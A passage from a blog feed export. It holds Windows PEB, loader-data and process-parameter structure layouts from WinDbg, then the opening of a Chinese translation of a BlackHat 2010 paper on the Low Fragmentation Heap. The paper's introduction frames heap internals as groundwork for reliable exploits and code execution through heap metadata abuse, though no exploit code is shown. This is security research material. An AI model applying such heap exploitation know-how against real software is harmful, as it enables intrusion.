CrossProcessFlags;                                            <span class="comment">//0x28</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG ProcessInJob:<span class="number">1</span>;                                           <span class="comment">//0x28</span></span><br><span class="line">            ULONG ProcessInitializing:<span class="number">1</span>;                                    <span class="comment">//0x28</span></span><br><span class="line">            ULONG ProcessUsingVEH:<span class="number">1</span>;                                        <span class="comment">//0x28</span></span><br><span class="line">            ULONG ProcessUsingVCH:<span class="number">1</span>;                                        <span class="comment">//0x28</span></span><br><span class="line">            ULONG ProcessUsingFTH:<span class="number">1</span>;                                        <span class="comment">//0x28</span></span><br><span class="line">            ULONG ReservedBits0:<span class="number">27</span>;                                         <span class="comment">//0x28</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        VOID* KernelCallbackTable;                                          <span class="comment">//0x2c</span></span><br><span class="line">        VOID* UserSharedInfoPtr;                                            <span class="comment">//0x2c</span></span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG SystemReserved[<span class="number">1</span>];                                                <span class="comment">//0x30</span></span><br><span class="line">    ULONG AtlThunkSListPtr32;                                               <span class="comment">//0x34</span></span><br><span class="line">    VOID* ApiSetMap;                                                        <span class="comment">//0x38</span></span><br><span class="line">    ULONG TlsExpansionCounter;                                              <span class="comment">//0x3c</span></span><br><span class="line">    VOID* TlsBitmap;                                                        <span class="comment">//0x40</span></span><br><span class="line">    ULONG TlsBitmapBits[<span class="number">2</span>];                                                 <span class="comment">//0x44</span></span><br><span class="line">    VOID* ReadOnlySharedMemoryBase;                                         <span class="comment">//0x4c</span></span><br><span class="line">    VOID* HotpatchInformation;                                              <span class="comment">//0x50</span></span><br><span class="line">    VOID** ReadOnlyStaticServerData;                                        <span class="comment">//0x54</span></span><br><span class="line">    VOID* AnsiCodePageData;                                                 <span class="comment">//0x58</span></span><br><span class="line">    VOID* OemCodePageData;                                                  <span class="comment">//0x5c</span></span><br><span class="line">    VOID* UnicodeCaseTableData;                                             <span class="comment">//0x60</span></span><br><span class="line">    ULONG NumberOfProcessors;                                               <span class="comment">//0x64</span></span><br><span class="line">    ULONG NtGlobalFlag;                                                     <span class="comment">//0x68</span></span><br><span class="line">    <span class="keyword">union</span> _LARGE_INTEGER CriticalSectionTimeout;                            <span class="comment">//0x70</span></span><br><span class="line">    ULONG HeapSegmentReserve;                                               <span class="comment">//0x78</span></span><br><span class="line">    ULONG HeapSegmentCommit;                                                <span class="comment">//0x7c</span></span><br><span class="line">    ULONG HeapDeCommitTotalFreeThreshold;                                   <span class="comment">//0x80</span></span><br><span class="line">    ULONG HeapDeCommitFreeBlockThreshold;                                   <span class="comment">//0x84</span></span><br><span class="line">    ULONG NumberOfHeaps;                                                    <span class="comment">//0x88</span></span><br><span class="line">    ULONG MaximumNumberOfHeaps;                                             <span class="comment">//0x8c</span></span><br><span class="line">    VOID** ProcessHeaps;                                                    <span class="comment">//0x90</span></span><br><span class="line">    VOID* GdiSharedHandleTable;                                             <span class="comment">//0x94</span></span><br><span class="line">    VOID* ProcessStarterHelper;                                             <span class="comment">//0x98</span></span><br><span class="line">    ULONG GdiDCAttributeList;                                               <span class="comment">//0x9c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span>* <span class="title">LoaderLock</span>;</span>                               <span class="comment">//0xa0</span></span><br><span class="line">    ULONG OSMajorVersion;                                                   <span class="comment">//0xa4</span></span><br><span class="line">    ULONG OSMinorVersion;                                                   <span class="comment">//0xa8</span></span><br><span class="line">    USHORT OSBuildNumber;                                                   <span class="comment">//0xac</span></span><br><span class="line">    USHORT OSCSDVersion;                                                    <span class="comment">//0xae</span></span><br><span class="line">    ULONG OSPlatformId;                                                     <span class="comment">//0xb0</span></span><br><span class="line">    ULONG ImageSubsystem;                                                   <span class="comment">//0xb4</span></span><br><span class="line">    ULONG ImageSubsystemMajorVersion;                                       <span class="comment">//0xb8</span></span><br><span class="line">    ULONG ImageSubsystemMinorVersion;                                       <span class="comment">//0xbc</span></span><br><span class="line">    ULONG ActiveProcessAffinityMask;                                        <span class="comment">//0xc0</span></span><br><span class="line">    ULONG GdiHandleBuffer[<span class="number">34</span>];                                              <span class="comment">//0xc4</span></span><br><span class="line">    VOID (*PostProcessInitRoutine)();                                       <span class="comment">//0x14c</span></span><br><span class="line">    VOID* TlsExpansionBitmap;                                               <span class="comment">//0x150</span></span><br><span class="line">    ULONG TlsExpansionBitmapBits[<span class="number">32</span>];                                       <span class="comment">//0x154</span></span><br><span class="line">    ULONG SessionId;                                                        <span class="comment">//0x1d4</span></span><br><span class="line">    <span class="keyword">union</span> _ULARGE_INTEGER AppCompatFlags;                                   <span class="comment">//0x1d8</span></span><br><span class="line">    <span class="keyword">union</span> _ULARGE_INTEGER AppCompatFlagsUser;                               <span class="comment">//0x1e0</span></span><br><span class="line">    VOID* pShimData;                                                        <span class="comment">//0x1e8</span></span><br><span class="line">    VOID* AppCompatInfo;                                                    <span class="comment">//0x1ec</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">CSDVersion</span>;</span>                                      <span class="comment">//0x1f0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACTIVATION_CONTEXT_DATA</span>* <span class="title">ActivationContextData</span>;</span>                 <span class="comment">//0x1f8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ASSEMBLY_STORAGE_MAP</span>* <span class="title">ProcessAssemblyStorageMap</span>;</span>                <span class="comment">//0x1fc</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ACTIVATION_CONTEXT_DATA</span>* <span class="title">SystemDefaultActivationContextData</span>;</span>    <span class="comment">//0x200</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">ASSEMBLY_STORAGE_MAP</span>* <span class="title">SystemAssemblyStorageMap</span>;</span>                 <span class="comment">//0x204</span></span><br><span class="line">    ULONG MinimumStackCommit;                                               <span class="comment">//0x208</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">FLS_CALLBACK_INFO</span>* <span class="title">FlsCallback</span>;</span>                                 <span class="comment">//0x20c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FlsListHead</span>;</span>                                         <span class="comment">//0x210</span></span><br><span class="line">    VOID* FlsBitmap;                                                        <span class="comment">//0x218</span></span><br><span class="line">    ULONG FlsBitmapBits[<span class="number">4</span>];                                                 <span class="comment">//0x21c</span></span><br><span class="line">    ULONG FlsHighIndex;                                                     <span class="comment">//0x22c</span></span><br><span class="line">    VOID* WerRegistrationData;                                              <span class="comment">//0x230</span></span><br><span class="line">    VOID* WerShipAssertPtr;                                                 <span class="comment">//0x234</span></span><br><span class="line">    VOID* pContextData;                                                     <span class="comment">//0x238</span></span><br><span class="line">    VOID* pImageHeaderHash;                                                 <span class="comment">//0x23c</span></span><br><span class="line">    <span class="keyword">union</span></span><br><span class="line">    &#123;</span><br><span class="line">        ULONG TracingFlags;                                                 <span class="comment">//0x240</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">        &#123;</span></span><br><span class="line">            ULONG HeapTracingEnabled:<span class="number">1</span>;                                     <span class="comment">//0x240</span></span><br><span class="line">            ULONG CritSecTracingEnabled:<span class="number">1</span>;                                  <span class="comment">//0x240</span></span><br><span class="line">            ULONG SpareTracingBits:<span class="number">30</span>;                                      <span class="comment">//0x240</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="PEB-LDR-DATA-1"><a href="#PEB-LDR-DATA-1" class="headerlink" title="_PEB_LDR_DATA"></a>_PEB_LDR_DATA</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; dt _PEB_LDR_DATA</span><br><span class="line">uxtheme!_PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x000</span> Length           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Initialized      : UChar</span><br><span class="line">   +<span class="number">0x008</span> SsHandle         : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> InLoadOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x014</span> InMemoryOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x01c</span> InInitializationOrderModuleList : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x024</span> EntryInProgress  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x028</span> ShutdownInProgress : UChar</span><br><span class="line">   +<span class="number">0x02c</span> ShutdownThreadId : Ptr32 Void</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x30 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Length;                                        <span class="comment">//0x0</span></span><br><span class="line">    UCHAR Initialized;                                   <span class="comment">//0x4</span></span><br><span class="line">    VOID* SsHandle;                                      <span class="comment">//0x8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InLoadOrderModuleList</span>;</span>            <span class="comment">//0xc</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InMemoryOrderModuleList</span>;</span>          <span class="comment">//0x14</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">InInitializationOrderModuleList</span>;</span>  <span class="comment">//0x1c</span></span><br><span class="line">    VOID* EntryInProgress;                               <span class="comment">//0x24</span></span><br><span class="line">    UCHAR ShutdownInProgress;                            <span class="comment">//0x28</span></span><br><span class="line">    VOID* ShutdownThreadId;                              <span class="comment">//0x2c</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="RTL-USER-PROCESS-PARAMETERS-1"><a href="#RTL-USER-PROCESS-PARAMETERS-1" class="headerlink" title="_RTL_USER_PROCESS_PARAMETERS"></a>_RTL_USER_PROCESS_PARAMETERS</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; dt _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">uxtheme!_RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">   +<span class="number">0x000</span> MaximumLength    : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Length           : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> DebugFlags       : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> ConsoleHandle    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x014</span> ConsoleFlags     : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> StandardInput    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> StandardOutput   : Ptr32 Void</span><br><span class="line">   +<span class="number">0x020</span> StandardError    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x024</span> CurrentDirectory : _CURDIR</span><br><span class="line">   +<span class="number">0x030</span> DllPath          : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x038</span> ImagePathName    : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x040</span> CommandLine      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x048</span> Environment      : Ptr32 Void</span><br><span class="line">   +<span class="number">0x04c</span> StartingX        : Uint4B</span><br><span class="line">   +<span class="number">0x050</span> StartingY        : Uint4B</span><br><span class="line">   +<span class="number">0x054</span> CountX           : Uint4B</span><br><span class="line">   +<span class="number">0x058</span> CountY           : Uint4B</span><br><span class="line">   +<span class="number">0x05c</span> CountCharsX      : Uint4B</span><br><span class="line">   +<span class="number">0x060</span> CountCharsY      : Uint4B</span><br><span class="line">   +<span class="number">0x064</span> FillAttribute    : Uint4B</span><br><span class="line">   +<span class="number">0x068</span> WindowFlags      : Uint4B</span><br><span class="line">   +<span class="number">0x06c</span> ShowWindowFlags  : Uint4B</span><br><span class="line">   +<span class="number">0x070</span> WindowTitle      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x078</span> DesktopInfo      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x080</span> ShellInfo        : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x088</span> RuntimeData      : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x090</span> CurrentDirectores : [<span class="number">32</span>] _RTL_DRIVE_LETTER_CURDIR</span><br><span class="line">   +<span class="number">0x290</span> EnvironmentSize  : Uint4B</span><br><span class="line">   +<span class="number">0x294</span> EnvironmentVersion : Uint4B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x298 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">RTL_USER_PROCESS_PARAMETERS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG MaximumLength;                                    <span class="comment">//0x0</span></span><br><span class="line">    ULONG Length;                                           <span class="comment">//0x4</span></span><br><span class="line">    ULONG Flags;                                            <span class="comment">//0x8</span></span><br><span class="line">    ULONG DebugFlags;                                       <span class="comment">//0xc</span></span><br><span class="line">    VOID* ConsoleHandle;                                    <span class="comment">//0x10</span></span><br><span class="line">    ULONG ConsoleFlags;                                     <span class="comment">//0x14</span></span><br><span class="line">    VOID* StandardInput;                                    <span class="comment">//0x18</span></span><br><span class="line">    VOID* StandardOutput;                                   <span class="comment">//0x1c</span></span><br><span class="line">    VOID* StandardError;                                    <span class="comment">//0x20</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">CURDIR</span> <span class="title">CurrentDirectory</span>;</span>                        <span class="comment">//0x24</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">DllPath</span>;</span>                         <span class="comment">//0x30</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">ImagePathName</span>;</span>                   <span class="comment">//0x38</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">CommandLine</span>;</span>                     <span class="comment">//0x40</span></span><br><span class="line">    VOID* Environment;                                      <span class="comment">//0x48</span></span><br><span class="line">    ULONG StartingX;                                        <span class="comment">//0x4c</span></span><br><span class="line">    ULONG StartingY;                                        <span class="comment">//0x50</span></span><br><span class="line">    ULONG CountX;                                           <span class="comment">//0x54</span></span><br><span class="line">    ULONG CountY;                                           <span class="comment">//0x58</span></span><br><span class="line">    ULONG CountCharsX;                                      <span class="comment">//0x5c</span></span><br><span class="line">    ULONG CountCharsY;                                      <span class="comment">//0x60</span></span><br><span class="line">    ULONG FillAttribute;                                    <span class="comment">//0x64</span></span><br><span class="line">    ULONG WindowFlags;                                      <span class="comment">//0x68</span></span><br><span class="line">    ULONG ShowWindowFlags;                                  <span class="comment">//0x6c</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">WindowTitle</span>;</span>                     <span class="comment">//0x70</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">DesktopInfo</span>;</span>                     <span class="comment">//0x78</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">ShellInfo</span>;</span>                       <span class="comment">//0x80</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">RuntimeData</span>;</span>                     <span class="comment">//0x88</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_DRIVE_LETTER_CURDIR</span> <span class="title">CurrentDirectores</span>[32];</span>  <span class="comment">//0x90</span></span><br><span class="line">    <span class="keyword">volatile</span> ULONG EnvironmentSize;                         <span class="comment">//0x290</span></span><br><span class="line">    <span class="keyword">volatile</span> ULONG EnvironmentVersion;                      <span class="comment">//0x294</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="RTL-CRITICAL-SECTION-1"><a href="#RTL-CRITICAL-SECTION-1" class="headerlink" title="_RTL_CRITICAL_SECTION"></a>_RTL_CRITICAL_SECTION</h4><p>&emsp;&emsp;见上方。</p><h4 id="ULARGE-INTEGER-1"><a href="#ULARGE-INTEGER-1" class="headerlink" title="_ULARGE_INTEGER"></a>_ULARGE_INTEGER</h4><p>&emsp;&emsp;未变化。</p><h4 id="UNICODE-STRING-3"><a href="#UNICODE-STRING-3" class="headerlink" title="_UNICODE_STRING"></a>_UNICODE_STRING</h4><p>&emsp;&emsp;见上方。</p><h4 id="ACTIVATION-CONTEXT-DATA"><a href="#ACTIVATION-CONTEXT-DATA" class="headerlink" title="_ACTIVATION_CONTEXT_DATA"></a>_ACTIVATION_CONTEXT_DATA</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; dt _ACTIVATION_CONTEXT_DATA</span><br><span class="line">ole32!_ACTIVATION_CONTEXT_DATA</span><br><span class="line">   +<span class="number">0x000</span> Magic            : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> HeaderSize       : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> FormatVersion    : Uint4B</span><br><span class="line">   +<span class="number">0x00c</span> TotalSize        : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> DefaultTocOffset : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> ExtendedTocOffset : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> AssemblyRosterOffset : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> Flags            : Uint4B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">ACTIVATION_CONTEXT_DATA</span> &#123;</span></span><br><span class="line">    ULONG Magic;</span><br><span class="line">    ULONG HeaderSize;</span><br><span class="line">    ULONG FormatVersion;</span><br><span class="line">    ULONG TotalSize;</span><br><span class="line">    ULONG DefaultTocOffset;</span><br><span class="line">    ULONG ExtendedTocOffset;</span><br><span class="line">    ULONG AssemblyRosterOffset;</span><br><span class="line">    ULONG Flags;</span><br><span class="line">&#125; ACTIVATION_CONTEXT_DATA, *PACTIVATION_CONTEXT_DATA;</span><br></pre></td></tr></table></figure><h4 id="ASSEMBLY-STORAGE-MAP"><a href="#ASSEMBLY-STORAGE-MAP" class="headerlink" title="_ASSEMBLY_STORAGE_MAP"></a>_ASSEMBLY_STORAGE_MAP</h4><p>&emsp;&emsp;未知。</p><h4 id="FLS-CALLBACK-INFO"><a href="#FLS-CALLBACK-INFO" class="headerlink" title="_FLS_CALLBACK_INFO"></a>_FLS_CALLBACK_INFO</h4><p>&emsp;&emsp;未知。</p><h4 id="LIST-ENTRY-2"><a href="#LIST-ENTRY-2" class="headerlink" title="_LIST_ENTRY"></a>_LIST_ENTRY</h4><p>&emsp;&emsp;见上方。</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>1、<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/teb/index.htm" target="_blank" rel="noopener">Geoff Chappell, Software Analyst - TEB</a><br>2、<a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm" target="_blank" rel="noopener">Geoff Chappell, Software Analyst - PEB</a><br>3、Windows Internals, 6ed, Part 1 - 3.10 Image Loader<br>4、<a href="https://www.unknowncheats.me/forum/general-programming-and-reversing/401590-windows-dll-loader.html" target="_blank" rel="noopener">Windows DLL Loader</a></p>]]></content>
      
      <categories>
          
          <category> Windows Internals </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> PEB </tag>
            
            <tag> TEB </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>翻译 - BlackHat USA 2010 - Understanding the Low Fragmentation Heap</title>
      <link href="/2021/03/22/BlackHat%20USA%202010%20-%20Understanding%20the%20Low%20Fragmentation%20Heap/"/>
      <url>/2021/03/22/BlackHat%20USA%202010%20-%20Understanding%20the%20Low%20Fragmentation%20Heap/</url>
      <content type="html"><![CDATA[<blockquote><p>1、这篇文章是对BlackHat USA 2010上Chris Valasek的议题《Understanding the Low Fragmentation Heap》的翻译。<br>2、在我分析CVE-2012-1876的过程中，对漏洞利用部分的堆布局不是很懂，所以找到了这篇文章进行翻译，以更好地理解漏洞利用中的堆布局。<br>3、LFH(Low Fragmentation Heap)是在Windows Vista版本中引入的。<br>4、本文是基于32位Windows 7 RTM版本的ntdll.dll(6.1.7600.16385)来进行分析LFH的结构的。<br>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;——当你的才华还配不上你的野心时，请静下来好好努力！<br><a id="more"></a></p></blockquote><h2 id="Introduction-简介"><a href="#Introduction-简介" class="headerlink" title="Introduction(简介)"></a>Introduction(简介)</h2><p>&emsp;&emsp;多年来，由于增加了<code>漏洞利用对抗措施</code>以及实施了更复杂的<code>算法和数据结构</code>，<code>Windows堆利用</code>的难度持续增加。由于这些<code>趋势</code>以及社区中<code>缺乏</code>全面的<code>堆相关知识</code>，使得<code>可靠的漏洞利用</code>已严重下降。保持对<code>堆管理器</code>的<code>内部工作原理</code>的全面的理解，可以区分<code>不可预测的错误</code>和<code>精确的漏洞利用</code>。</p><p>&emsp;&emsp;自<code>Windows Vista</code>的引入，<code>低碎片堆(Low Fragmentation heap)</code>已成为Windows操作系统的默认<code>前端堆管理器(Front-End)</code>。这个新的前端堆管理器引入了<code>一组不同的数据结构和算法</code>，这些数据结构和算法取代了<code>快表(Lookaside)</code>。同时，该系统还改变了<code>后端堆管理器</code>的工作方式。必须仔细阅读所有这些资料，以理解<code>这些变化</code>对在<code>Windows 7</code>上的<code>应用程序中分配和释放内存</code>所产生的影响。</p><p>&emsp;&emsp;本文的主要目的是使读者熟悉与<code>低碎片堆</code>相关的新创建的<code>逻辑</code>和<code>数据结构</code>。首先，通过解释堆管理器中的<code>新数据结构</code>及其<code>耦合关系</code>，将提供一个清晰简洁的基础。然后，将讨论有关<code>操纵</code>这些数据结构的<code>底层算法</code>的详细说明。最后，将揭秘一些新的<code>漏洞利用开发技术</code>，同时提供一些使用这些新发现的技术的<code>实际应用范例</code>。 </p><h3 id="Overview-概述"><a href="#Overview-概述" class="headerlink" title="Overview(概述)"></a>Overview(概述)</h3><p>&emsp;&emsp;本文分为 <strong><code>四个单独的部分</code></strong>。<strong><code>第一部分</code></strong> 详细介绍了<code>核心数据结构</code>，这些数据结构贯穿于整个<code>堆管理器</code>中，被用于<code>维护内存</code>。对这些数据结构有一个透彻的理解是理解本文中<code>其余部分内容</code>的<code>前提</code>。</p><p>&emsp;&emsp;<strong><code>第二部分</code></strong> 将讨论<code>Windows Vista</code>中引入并在<code>Windows 7</code>中继续使用的新创建的<code>架构(Architecture)</code>。此部分会展示从<code>Windows XP</code>代码库演变而来的<code>数据结构</code>是如何使用的。</p><p>&emsp;&emsp;<strong><code>第三部分</code></strong> 将深入探讨<code>Windows 7堆</code>使用的<code>核心算法</code>。本节将对<code>前端</code>和<code>后端</code>堆管理子系统进行详细介绍。理解本节中的内容将有助于<code>漏洞利用开发</code>，并为第四节提供<code>框架</code>。</p><p>&emsp;&emsp;<strong><code>第四部分</code></strong> ，也是本文的最后一部分，将展示如何使用<code>底层堆管理器</code>，对堆进行<code>精心操纵</code>，产生<code>可靠的堆操作</code>的策略，通过<code>用户</code>提供的信息，并滥用<code>堆元数据</code>，以实现<code>代码执行</code>。</p><h3 id="Prior-Works-先前的工作"><a href="#Prior-Works-先前的工作" class="headerlink" title="Prior Works(先前的工作)"></a>Prior Works(先前的工作)</h3><p>&emsp;&emsp;尽管当前可能有非常多的有关<code>“低碎片堆(Low Fragmentation heap)”</code>的信息，但我还是仅列出我进行<code>研究时</code>使用的一些资料。我认为这些资料应被视为理解本文的<code>必读资料</code>。对于我可能在<code>此列表</code>中<code>遗漏</code>的任何人，我预先在这里<code>致歉</code>。</p><ul><li>我仍然坚信<code>本·霍克斯(Ben Hawkes)</code>在几年前就知道了这一点。他于<code>2008年</code>在<code>RuxCon</code>/<code>Blackhat</code>上的演讲仍然是我工作的灵感。(Hawkes 2008年)</li><li><code>Nico Waisman</code>对<code>Windows Vista</code>做了大量的<code>逆向工作</code>，并在<code>Immunity Debugger</code>的<code>libheap.py</code>插件中提供了详细的信息。(Waisman 2008)</li><li>我认为，<code>布雷特·摩尔(Brett Moore)</code>的论文<code>《Heaps about Heaps》</code>是有史以来最好的<code>堆演示文稿</code>之一。我认为它将永远用作大量<code>堆相关工作</code>的<code>参考资料</code>。(Moore 2007)</li><li><code>布雷特·摩尔(Brett Moore)</code>还发布了利用<code>Windows XP SP2</code>中<code>FreeList[0]</code>的<code>Link过程</code>的利用手法，本文也会提及此手法。(Moore 2005)</li><li><code>理查德·约翰逊(Richard Johnson)</code>在<code>ToorCon 2006</code>上的演讲描述了为<code>Windows Vista</code>新创建的<code>“低碎片堆(Low Fragmentation Heap)”</code>。这是<code>第一个</code>(也许是<code>唯一一个</code>)揭示有关<code>LFH算法和数据结构</code>的详细信息的资料。(Johnson 2006)</li><li>尽管<code>David B. Probert(Ph.D.)</code>的演讲主要是针对<code>“低碎片堆(Low Fragmentation Heap)”</code>的<code>性能优势</code>，但对于试图理解在<code>Windows 7</code>中的<code>堆实现的变化</code>背后的原因时，它仍然非常有价值。（Probert）</li><li><code>Adrian Marinescu</code>在<code>Blackhat 2006</code>上就<code>Windows Vista</code>堆实现变化进行了介绍。它清楚地显示了从<code>旧堆管理机制</code>过渡到<code>当下</code>的原因。(Marinescu 2006)</li><li>最后，<code>Lionel d&#39;Hauenens</code>(<a href="http://www.laboskopia.com)的`Symbol" target="_blank" rel="noopener">http://www.laboskopia.com)的`Symbol</a> Type Viewer<code>是我分析</code>Windows 7<code>堆管理器使用的</code>数据结构<code>时使用的一个宝贵的工具。如果没有它，可能会浪费大量时间来</code>寻找数据结构`。</li></ul><h3 id="Prerequisites-预备知识"><a href="#Prerequisites-预备知识" class="headerlink" title="Prerequisites(预备知识)"></a>Prerequisites(预备知识)</h3><p>&emsp;&emsp;除非<code>另有说明</code>，否则本文中使用的所有<code>伪代码</code>和<code>结构体</code>均源自<code>32位Windows 7</code>的<code>ntdll.dll</code>，版本为<code>6.1.7600.16385</code>。结构体定义是通过<code>Symbol 